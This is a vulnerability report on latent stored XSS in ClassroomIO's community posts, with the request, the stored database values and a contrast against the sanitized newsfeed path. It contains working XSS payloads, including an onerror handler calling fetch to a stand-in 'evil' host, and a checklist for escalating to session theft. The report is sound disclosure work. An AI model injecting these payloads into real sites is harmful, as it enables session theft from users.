# VULN-031 — Community title/body stored unsanitized (latent stored XSS)

**Software**: ClassroomIO
**Repository**: https://github.com/classroomio/classroomio
**Affected version**: 0.1.13 (package.json) — commit-pinned
**Target commit**: 0c356ad6f1a4d8449425b902afae58b3ebd9f443
**Status**: CONFIRMED (stored unsanitized HTML-injection; script execution mitigated today)
**Severity (static)**: Medium — CVSS 3.1 5.4 (`AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`)
**Validated at**: 2026-09-27

## Preconditions
- One self-registered STUDENT (org member) with a course to attach the post to.

## Request
Decisive request (see `request.http`) — a community post whose title/body carry XSS payloads:
```
POST /community HTTP/1.1
Host: localhost:21527
Content-Type: application/json
cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
Cookie: classroomio.session_token=<STUDENT session>

{ "slug":"xss-post_<rand>",
  "title":"<img src=x onerror=alert(\"<marker>\")>",
  "body":"<script>alert(\"<marker>\")</script><img src=x onerror=\"fetch('//evil/<marker>')\"><b><marker></b>",
  "courseId":"<course>", "organizationId":"48bbdff8-...", "authorProfileId":"<student>", "votes":0 }
```

## Response
`POST /community` → **HTTP 201**. The stored row is verified via `psql` (see `response.txt`).

## Observation
- **Community stores the payload byte-for-byte.** DB `community_question.body` =
  `<script>alert("<marker>")</script><img src=x onerror="fetch('//evil/<marker>')"><b><marker></b>`
  and `community_question.title` = `<img src=x onerror=alert("<marker>")>` — **no** server-side
  sanitization.
- **Contrast: the newsfeed path sanitizes the identical input.** Posting the same body to a course
  newsfeed stored `<img src="x"><b><marker></b>` — the `<script>` element and the `onerror`
  attribute were **stripped** by `sanitizeHtml` (server-side DOMPurify). This proves the missing
  sanitizer is specific to the community write path.
- **Script execution is mitigated today**, not by the write path but by (a) the dashboard render
  going through `SafeHtmlContent` → DOMPurify and (b) a CSP without `'unsafe-inline'` in
  `script-src`. So the confirmed effect is **stored unsanitized HTML-injection / latent stored XSS**,
  not live script-XSS in the dashboard right now.

## Side effects
- Creates one community question and one contrast newsfeed item per run (random markers). Persists
  inert (mitigated) HTML in the forum. Non-destructive.

## Research & references
- OWASP WSTG-INPV-02 "Testing for Stored Cross Site Scripting"; OWASP XSS Prevention Cheat Sheet
  (sanitize on output AND neutralize dangerous markup on input as defense-in-depth).
- CWE-79 Improper Neutralization of Input During Web Page Generation.
- The sibling safe path: `apps/api/src/services/newsfeed/newsfeed.ts:108` calls
  `sanitizeHtml(data.content)`; the sanitizer is `packages/core/src/utils/sanitize-html.ts`
  (isomorphic-dompurify).

## If FAILED
n/a — the storage gap is CONFIRMED.

## If NEEDS_MANUAL
Live script execution (session theft) is **not** reproducible today: it needs a render path that
skips DOMPurify (SSR `{@html}`, an email/PDF/export renderer, a third-party API consumer) or a CSP
that permits inline script. Human checklist to escalate to full stored XSS: (1) identify any
consumer that renders `community_question.body` without `sanitizeHtml`/DOMPurify; (2) confirm its
response lacks a script-blocking CSP; (3) load the stored post there — the `onerror`/`<script>`
payload fires. The unsanitized persistence proven here is the necessary precondition for all of
these.
